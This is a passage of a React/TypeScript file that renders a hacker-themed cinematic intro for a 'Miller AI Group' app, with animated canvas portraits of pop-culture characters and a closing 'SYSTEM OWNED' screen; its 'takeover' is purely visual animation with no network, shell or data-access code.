                      className={`w-12 h-1 rounded ${i === currentIndex ? 'bg-white' : 'bg-neutral-700'}`}
                    />
                  ))}
                </motion.div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      {/* Corner brackets */}
      <div className="absolute top-8 left-8 w-16 h-16 border-t-2 border-l-2" style={{ borderColor: character.color }} />
      <div className="absolute top-8 right-8 w-16 h-16 border-t-2 border-r-2" style={{ borderColor: character.color }} />
      <div className="absolute bottom-8 left-8 w-16 h-16 border-b-2 border-l-2" style={{ borderColor: character.color }} />
      <div className="absolute bottom-8 right-8 w-16 h-16 border-b-2 border-r-2" style={{ borderColor: character.color }} />

      {/* Bottom bar */}
      <div className="absolute bottom-0 left-0 right-0 h-16 bg-gradient-to-t from-black to-transparent" />
      <div className="absolute bottom-4 left-8 right-8 flex justify-between font-mono text-xs">
        <span style={{ color: character.color }}>MILLER AI GROUP // OPERATIVE DOSSIER</span>
        <span className="text-neutral-500">CLEARANCE: OMEGA BLACK</span>
      </div>
    </motion.div>
  )
}

// ============================================
// CHARACTER PORTRAIT - Recognizable Features
// ============================================
function CharacterPortrait({ character }: { character: typeof CHARACTERS[0] }) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const animationRef = useRef<number | undefined>(undefined)
  const frameRef = useRef(0)

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    const size = 400
    canvas.width = size
    canvas.height = size

    const hexToRgb = (hex: string) => {
      const result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex)
      return result ? {
        r: parseInt(result[1], 16),
        g: parseInt(result[2], 16),
        b: parseInt(result[3], 16)
      } : { r: 255, g: 0, b: 255 }
    }

    const rgb = hexToRgb(character.color)
    const centerX = size / 2
    const centerY = size / 2

    const drawJohnWick = (ctx: CanvasRenderingContext2D, time: number) => {
      const breathe = Math.sin(time * 2) * 2

      // Long dark hair
      ctx.fillStyle = '#1a1a1a'
      ctx.beginPath()
      ctx.ellipse(centerX, centerY - 40 + breathe, 70, 85, 0, 0, Math.PI * 2)
      ctx.fill()

      // Face
      ctx.fillStyle = '#d4a574'
      ctx.beginPath()
      ctx.ellipse(centerX, centerY - 50 + breathe, 50, 60, 0, 0, Math.PI * 2)
      ctx.fill()

      // Beard/stubble
      ctx.fillStyle = '#2a2a2a'
      ctx.beginPath()
      ctx.ellipse(centerX, centerY - 20 + breathe, 45, 35, 0, 0.3, Math.PI - 0.3)
      ctx.fill()

      // Suit collar
      ctx.fillStyle = '#0a0a0a'
      ctx.beginPath()
      ctx.moveTo(centerX - 80, centerY + 60 + breathe)
      ctx.lineTo(centerX - 30, centerY + 20 + breathe)
      ctx.lineTo(centerX, centerY + 40 + breathe)
      ctx.lineTo(centerX + 30, centerY + 20 + breathe)
      ctx.lineTo(centerX + 80, centerY + 60 + breathe)
      ctx.lineTo(centerX + 100, size)
      ctx.lineTo(centerX - 100, size)
      ctx.closePath()
      ctx.fill()

      // White shirt
      ctx.fillStyle = '#ffffff'
      ctx.beginPath()
      ctx.moveTo(centerX - 15, centerY + 30 + breathe)
      ctx.lineTo(centerX, centerY + 60 + breathe)
      ctx.lineTo(centerX + 15, centerY + 30 + breathe)
      ctx.closePath()
      ctx.fill()

      // Eyes - intense
      ctx.fillStyle = '#000000'
      ctx.beginPath()
      ctx.ellipse(centerX - 18, centerY - 60 + breathe, 8, 5, 0, 0, Math.PI * 2)
      ctx.ellipse(centerX + 18, centerY - 60 + breathe, 8, 5, 0, 0, Math.PI * 2)
      ctx.fill()

      // Eyebrows - furrowed
      ctx.strokeStyle = '#1a1a1a'
      ctx.lineWidth = 4
      ctx.beginPath()
      ctx.moveTo(centerX - 30, centerY - 75 + breathe)
      ctx.lineTo(centerX - 10, centerY - 70 + breathe)
      ctx.moveTo(centerX + 30, centerY - 75 + breathe)
      ctx.lineTo(centerX + 10, centerY - 70 + breathe)
      ctx.stroke()
    }

    const drawBart = (ctx: CanvasRenderingContext2D, time: number) => {
      const bounce = Math.sin(time * 4) * 3

      // Spiky hair - THE signature Bart look
      ctx.fillStyle = '#ffd700'
      for (let i = 0; i < 9; i++) {
        const angle = (i / 9) * Math.PI - Math.PI / 2
        const spikeLength = 30 + (i % 2) * 10
        ctx.beginPath()
        ctx.moveTo(centerX + Math.cos(angle - 0.2) * 45, centerY - 70 + Math.sin(angle - 0.2) * 45 + bounce)
        ctx.lineTo(centerX + Math.cos(angle) * (45 + spikeLength), centerY - 70 + Math.sin(angle) * (45 + spikeLength) + bounce)
        ctx.lineTo(centerX + Math.cos(angle + 0.2) * 45, centerY - 70 + Math.sin(angle + 0.2) * 45 + bounce)
        ctx.closePath()
        ctx.fill()
      }

      // Head
      ctx.fillStyle = '#ffd700'
      ctx.beginPath()
      ctx.ellipse(centerX, centerY - 40 + bounce, 50, 55, 0, 0, Math.PI * 2)
      ctx.fill()

      // Eyes - big round Simpsons style
      ctx.fillStyle = '#ffffff'
      ctx.beginPath()
      ctx.ellipse(centerX - 15, centerY - 50 + bounce, 18, 22, 0, 0, Math.PI * 2)
      ctx.ellipse(centerX + 15, centerY - 50 + bounce, 18, 22, 0, 0, Math.PI * 2)
      ctx.fill()

      // Pupils
      ctx.fillStyle = '#000000'
      ctx.beginPath()
      ctx.arc(centerX - 10, centerY - 48 + bounce, 6, 0, Math.PI * 2)
      ctx.arc(centerX + 20, centerY - 48 + bounce, 6, 0, Math.PI * 2)
      ctx.fill()

      // Mischievous smirk
      ctx.strokeStyle = '#000000'
      ctx.lineWidth = 3
      ctx.beginPath()
      ctx.arc(centerX, centerY - 25 + bounce, 20, 0.2, Math.PI - 0.2)
      ctx.stroke()

      // Red shirt
      ctx.fillStyle = '#ff4444'
      ctx.beginPath()
      ctx.moveTo(centerX - 60, centerY + 30 + bounce)
      ctx.lineTo(centerX + 60, centerY + 30 + bounce)
      ctx.lineTo(centerX + 80, size)
      ctx.lineTo(centerX - 80, size)
      ctx.closePath()
      ctx.fill()

      // Orange trim
      ctx.fillStyle = '#ff8c00'
      ctx.fillRect(centerX - 60, centerY + 30 + bounce, 120, 15)
    }

    const drawJoker = (ctx: CanvasRenderingContext2D, time: number) => {
      const twitch = Math.random() > 0.95 ? (Math.random() - 0.5) * 10 : 0
      const breathe = Math.sin(time * 2) * 2

      // Green slicked back hair
      ctx.fillStyle = '#228b22'
      ctx.beginPath()
      ctx.ellipse(centerX + twitch, centerY - 50 + breathe, 55, 70, 0, Math.PI, Math.PI * 2)
      ctx.fill()

      // Hair strands
      for (let i = 0; i < 5; i++) {
        ctx.beginPath()
        ctx.moveTo(centerX - 40 + i * 20 + twitch, centerY - 100 + breathe)
        ctx.quadraticCurveTo(
          centerX - 30 + i * 20 + twitch,
          centerY - 130 + breathe,
          centerX - 20 + i * 20 + twitch,
          centerY - 110 + breathe
        )
        ctx.lineWidth = 8
        ctx.strokeStyle = '#228b22'
        ctx.stroke()
      }

      // White face
      ctx.fillStyle = '#f5f5f5'
      ctx.beginPath()
      ctx.ellipse(centerX + twitch, centerY - 40 + breathe, 50, 60, 0, 0, Math.PI * 2)
      ctx.fill()

      // Dark eye sockets
      ctx.fillStyle = '#2a2a4a'
      ctx.beginPath()
      ctx.ellipse(centerX - 20 + twitch, centerY - 55 + breathe, 15, 12, -0.2, 0, Math.PI * 2)
      ctx.ellipse(centerX + 20 + twitch, centerY - 55 + breathe, 15, 12, 0.2, 0, Math.PI * 2)
      ctx.fill()

      // Eyes
      ctx.fillStyle = '#000000'
      ctx.beginPath()
      ctx.arc(centerX - 20 + twitch, centerY - 55 + breathe, 5, 0, Math.PI * 2)
      ctx.arc(centerX + 20 + twitch, centerY - 55 + breathe, 5, 0, Math.PI * 2)
      ctx.fill()

      // THE SMILE - red scars
      ctx.fillStyle = '#cc0000'
      ctx.beginPath()
      ctx.moveTo(centerX - 45 + twitch, centerY - 25 + breathe)
      ctx.quadraticCurveTo(centerX + twitch, centerY + 10 + breathe, centerX + 45 + twitch, centerY - 25 + breathe)
      ctx.quadraticCurveTo(centerX + twitch, centerY - 10 + breathe, centerX - 45 + twitch, centerY - 25 + breathe)
      ctx.fill()

      // Smile scar lines
      ctx.strokeStyle = '#990000'
      ctx.lineWidth = 2
      ctx.beginPath()
      ctx.moveTo(centerX - 45 + twitch, centerY - 25 + breathe)
      ctx.lineTo(centerX - 55 + twitch, centerY - 35 + breathe)
      ctx.moveTo(centerX + 45 + twitch, centerY - 25 + breathe)
      ctx.lineTo(centerX + 55 + twitch, centerY - 35 + breathe)
      ctx.stroke()

      // Purple suit
      ctx.fillStyle = '#4b0082'
      ctx.beginPath()
      ctx.moveTo(centerX - 70 + twitch, centerY + 40 + breathe)
      ctx.lineTo(centerX - 25 + twitch, centerY + 10 + breathe)
      ctx.lineTo(centerX + twitch, centerY + 30 + breathe)
      ctx.lineTo(centerX + 25 + twitch, centerY + 10 + breathe)
      ctx.lineTo(centerX + 70 + twitch, centerY + 40 + breathe)
      ctx.lineTo(centerX + 90 + twitch, size)
      ctx.lineTo(centerX - 90 + twitch, size)
      ctx.closePath()
      ctx.fill()

      // Green vest
      ctx.fillStyle = '#228b22'
      ctx.beginPath()
      ctx.moveTo(centerX - 20 + twitch, centerY + 20 + breathe)
      ctx.lineTo(centerX + twitch, centerY + 50 + breathe)
      ctx.lineTo(centerX + 20 + twitch, centerY + 20 + breathe)
      ctx.closePath()
      ctx.fill()
    }

    const drawWolf = (ctx: CanvasRenderingContext2D, time: number) => {
      const breathe = Math.sin(time * 2) * 2

      // Slicked back dark hair
      ctx.fillStyle = '#2a2a2a'
      ctx.beginPath()
      ctx.ellipse(centerX, centerY - 55 + breathe, 50, 45, 0, Math.PI, Math.PI * 2)
      ctx.fill()

      // Face
      ctx.fillStyle = '#d4a574'
      ctx.beginPath()
      ctx.ellipse(centerX, centerY - 45 + breathe, 48, 58, 0, 0, Math.PI * 2)
      ctx.fill()

      // Confident smirk
      ctx.strokeStyle = '#8b4513'
      ctx.lineWidth = 3
      ctx.beginPath()
      ctx.arc(centerX + 5, centerY - 20 + breathe, 15, 0.1, Math.PI - 0.3)
      ctx.stroke()

      // Eyes - intense, confident
      ctx.fillStyle = '#000000'
      ctx.beginPath()
      ctx.ellipse(centerX - 18, centerY - 55 + breathe, 7, 5, 0, 0, Math.PI * 2)
      ctx.ellipse(centerX + 18, centerY - 55 + breathe, 7, 5, 0, 0, Math.PI * 2)
      ctx.fill()

      // Raised eyebrow
      ctx.strokeStyle = '#2a2a2a'
      ctx.lineWidth = 3
      ctx.beginPath()
      ctx.arc(centerX + 18, centerY - 68 + breathe, 12, Math.PI + 0.3, Math.PI * 2 - 0.3)
      ctx.stroke()

      // Expensive suit
      ctx.fillStyle = '#1a1a3a'
      ctx.beginPath()
      ctx.moveTo(centerX - 75, centerY + 50 + breathe)
      ctx.lineTo(centerX - 30, centerY + 15 + breathe)
      ctx.lineTo(centerX, centerY + 35 + breathe)
      ctx.lineTo(centerX + 30, centerY + 15 + breathe)
      ctx.lineTo(centerX + 75, centerY + 50 + breathe)
      ctx.lineTo(centerX + 95, size)
      ctx.lineTo(centerX - 95, size)
      ctx.closePath()
      ctx.fill()

      // White shirt
      ctx.fillStyle = '#ffffff'
      ctx.beginPath()
      ctx.moveTo(centerX - 15, centerY + 25 + breathe)
      ctx.lineTo(centerX, centerY + 55 + breathe)
      ctx.lineTo(centerX + 15, centerY + 25 + breathe)
      ctx.closePath()
      ctx.fill()

      // Gold tie
      ctx.fillStyle = '#ffd700'
      ctx.beginPath()
      ctx.moveTo(centerX - 8, centerY + 30 + breathe)
      ctx.lineTo(centerX, centerY + 80 + breathe)
      ctx.lineTo(centerX + 8, centerY + 30 + breathe)
      ctx.closePath()
      ctx.fill()
    }

    const drawDuchess = (ctx: CanvasRenderingContext2D, time: number) => {
      const sway = Math.sin(time * 1.5) * 2

      // Long blonde hair
      ctx.fillStyle = '#ffd700'
      ctx.beginPath()
      ctx.ellipse(centerX + sway, centerY - 30, 65, 90, 0, 0, Math.PI * 2)
      ctx.fill()

      // Hair waves
      ctx.fillStyle = '#daa520'
      for (let i = 0; i < 3; i++) {
        ctx.beginPath()
        ctx.ellipse(centerX - 50 + i * 25 + sway, centerY + 20, 8, 40, 0.2, 0, Math.PI * 2)
        ctx.fill()
      }

      // Face
      ctx.fillStyle = '#f5deb3'
      ctx.beginPath()
      ctx.ellipse(centerX + sway, centerY - 45, 42, 52, 0, 0, Math.PI * 2)
      ctx.fill()

      // Eyes - alluring
      ctx.fillStyle = '#1a5f7a'
      ctx.beginPath()
      ctx.ellipse(centerX - 15 + sway, centerY - 52, 8, 6, 0, 0, Math.PI * 2)
      ctx.ellipse(centerX + 15 + sway, centerY - 52, 8, 6, 0, 0, Math.PI * 2)
      ctx.fill()

      // Eyelashes
      ctx.strokeStyle = '#000000'
      ctx.lineWidth = 2
      for (let i = 0; i < 3; i++) {
        ctx.beginPath()
        ctx.moveTo(centerX - 20 + i * 5 + sway, centerY - 58)
        ctx.lineTo(centerX - 22 + i * 5 + sway, centerY - 65)
        ctx.moveTo(centerX + 10 + i * 5 + sway, centerY - 58)
        ctx.lineTo(centerX + 8 + i * 5 + sway, centerY - 65)
        ctx.stroke()
      }

      // Red lips
      ctx.fillStyle = '#cc0000'
      ctx.beginPath()
      ctx.ellipse(centerX + sway, centerY - 25, 12, 6, 0, 0, Math.PI * 2)
      ctx.fill()

      // Elegant dress
      ctx.fillStyle = '#ff1493'
      ctx.beginPath()
      ctx.moveTo(centerX - 50 + sway, centerY + 20)
      ctx.quadraticCurveTo(centerX + sway, centerY, centerX + 50 + sway, centerY + 20)
      ctx.lineTo(centerX + 80 + sway, size)
      ctx.lineTo(centerX - 80 + sway, size)
      ctx.closePath()
      ctx.fill()

      // Necklace
      ctx.strokeStyle = '#ffd700'
      ctx.lineWidth = 3
      ctx.beginPath()
      ctx.arc(centerX + sway, centerY + 5, 30, 0.3, Math.PI - 0.3)
      ctx.stroke()

      // Diamond pendant
      ctx.fillStyle = '#ffffff'
      ctx.beginPath()
      ctx.moveTo(centerX + sway, centerY + 30)
      ctx.lineTo(centerX - 8 + sway, centerY + 40)
      ctx.lineTo(centerX + sway, centerY + 55)
      ctx.lineTo(centerX + 8 + sway, centerY + 40)
      ctx.closePath()
      ctx.fill()
    }

    const animate = () => {
      frameRef.current += 0.016
      const time = frameRef.current

      // Clear
      ctx.clearRect(0, 0, size, size)

      // Glow effect
      ctx.shadowBlur = 30
      ctx.shadowColor = character.color

      // Draw the appropriate character
      switch (character.id) {
        case 'wick': drawJohnWick(ctx, time); break
        case 'bart': drawBart(ctx, time); break
        case 'joker': drawJoker(ctx, time); break
        case 'wolf': drawWolf(ctx, time); break
        case 'duchess': drawDuchess(ctx, time); break
      }

      ctx.shadowBlur = 0

      // Scan line effect
      const scanY = (time * 100) % size
      ctx.strokeStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.3)`
      ctx.lineWidth = 2
      ctx.beginPath()
      ctx.moveTo(0, scanY)
      ctx.lineTo(size, scanY)
      ctx.stroke()

      // Glitch effect occasionally
      if (Math.random() > 0.97) {
        const glitchY = Math.random() * size
        const glitchH = Math.random() * 20 + 5
        ctx.fillStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.5)`
        ctx.fillRect(0, glitchY, size, glitchH)
      }

      animationRef.current = requestAnimationFrame(animate)
    }

    animate()

    return () => {
      if (animationRef.current) cancelAnimationFrame(animationRef.current)
    }
  }, [character])

  return (
    <motion.div
      className="relative"
      initial={{ scale: 0.8, opacity: 0 }}
      animate={{ scale: 1, opacity: 1 }}
      transition={{ type: 'spring', duration: 0.5 }}
    >
      {/* Glow backdrop */}
      <div
        className="absolute inset-0 blur-3xl opacity-50"
        style={{ background: character.color }}
      />

      <canvas
        ref={canvasRef}
        width={400}
        height={400}
        className="relative z-10"
      />

      {/* Frame */}
      <div
        className="absolute inset-0 border-2 pointer-events-none"
        style={{ borderColor: character.color }}
      />
    </motion.div>
  )
}

// ============================================
// SCENE 7: SYSTEM OWNED
// ============================================
function SystemOwnedScene({ onComplete, userName }: { onComplete: () => void; userName: string }) {
  useEffect(() => {
    const timer = setTimeout(onComplete, 5000)
    return () => clearTimeout(timer)
  }, [onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black flex items-center justify-center"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <DedSecBackground intensity={1.5} />

      <motion.div
        className="relative z-10 text-center"
        initial={{ scale: 0.5, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ type: 'spring', duration: 0.8 }}
      >
        {/* ASCII Art */}
        <motion.pre
          className="text-fuchsia-500 text-xs md:text-sm font-mono mb-8 leading-tight"
          style={{ textShadow: '0 0 20px rgba(255,0,255,0.8)' }}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.5 }}
        >
{`
███╗   ███╗██╗██╗     ██╗     ███████╗██████╗
████╗ ████║██║██║     ██║     ██╔════╝██╔══██╗
██╔████╔██║██║██║     ██║     █████╗  ██████╔╝
██║╚██╔╝██║██║██║     ██║     ██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║███████╗███████╗███████╗██║  ██║
╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
     █████╗ ██╗    ██████╗ ██████╗  ██████╗ ██╗   ██╗██████╗
    ██╔══██╗██║   ██╔════╝ ██╔══██╗██╔═══██╗██║   ██║██╔══██╗
    ███████║██║   ██║  ███╗██████╔╝██║   ██║██║   ██║██████╔╝
    ██╔══██║██║   ██║   ██║██╔══██╗██║   ██║██║   ██║██╔═══╝
    ██║  ██║██║   ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║
    ╚═╝  ╚═╝╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝
`}
        </motion.pre>

        <motion.h1
          className="text-5xl md:text-7xl font-bold font-mono mb-4"
          style={{
            color: '#ff0040',
            textShadow: '0 0 50px rgba(255,0,64,0.8), 4px 0 0 #00ffff, -4px 0 0 #ff00ff',
          }}
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 1 }}
        >
          SYSTEM OWNED
        </motion.h1>

        <motion.p
          className="text-2xl font-mono text-fuchsia-400 mb-2"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1.5 }}
        >
          Welcome to the collective, {userName}
        </motion.p>

        <motion.p
          className="text-sm font-mono text-neutral-500"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 2 }}
        >
          Your system now belongs to Miller AI Group
        </motion.p>

        {/* Glitch lines */}
        <motion.div
          className="absolute inset-0 pointer-events-none"
          animate={{
            opacity: [0, 0.5, 0],
          }}
          transition={{ duration: 0.1, repeat: Infinity, repeatDelay: 2 }}
        >
          {[...Array(5)].map((_, i) => (
            <div
              key={i}
              className="absolute left-0 right-0 h-1 bg-fuchsia-500"
              style={{ top: `${Math.random() * 100}%` }}
            />
          ))}
        </motion.div>
      </motion.div>
    </motion.div>
  )
}

// ============================================
// MAIN CINEMATIC TAKEOVER
// ============================================
export function CinematicTakeover({ onComplete, userName = 'Operator' }: CinematicTakeoverProps) {
  const [scene, setScene] = useState<SceneType>('boot')

  const handleSceneComplete = useCallback((nextScene: SceneType) => {
    setScene(nextScene)
  }, [])

  useEffect(() => {
    if (scene === 'complete') {
      onComplete()
    }
  }, [scene, onComplete])

  return (
    <div className="fixed inset-0 bg-black z-50">
      <AnimatePresence mode="wait">
        {scene === 'boot' && (
          <BootSequence
            key="boot"
            onComplete={() => handleSceneComplete('interference')}
          />
        )}

        {scene === 'interference' && (
          <InterferenceScene
            key="interference"
            onComplete={() => handleSceneComplete('network-breach')}
          />
        )}

        {scene === 'network-breach' && (
          <NetworkBreachScene
            key="network"
            onComplete={() => handleSceneComplete('terminal-takeover')}
          />
        )}

        {scene === 'terminal-takeover' && (
          <TerminalTakeoverScene
            key="terminal"
            onComplete={() => handleSceneComplete('file-intrusion')}
          />
        )}

        {scene === 'file-intrusion' && (
          <FileIntrusionScene
            key="files"
            onComplete={() => handleSceneComplete('character-briefing')}
          />
        )}

        {scene === 'character-briefing' && (
          <CharacterBriefingScene
            key="characters"
            onComplete={() => handleSceneComplete('system-owned')}
          />
        )}

        {scene === 'system-owned' && (
          <SystemOwnedScene
            key="owned"
            userName={userName}
            onComplete={() => handleSceneComplete('complete')}
          />
        )}
      </AnimatePresence>
    </div>
  )
}

export type { CinematicTakeoverProps }
